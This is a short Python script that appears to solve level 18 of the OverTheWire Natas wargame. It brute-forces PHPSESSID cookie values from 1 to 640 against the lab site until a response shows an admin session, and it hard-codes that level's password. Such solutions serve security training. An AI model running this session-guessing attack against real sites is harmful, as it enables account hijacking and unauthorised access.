#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.Session()

for session_id in range(1, 641):
	response = session.get(url, cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
	content = response.text

	if ("You are an admin" in content):
		print("Got it!")
		print(content)
		break
	else:
		print("Trying", session_id)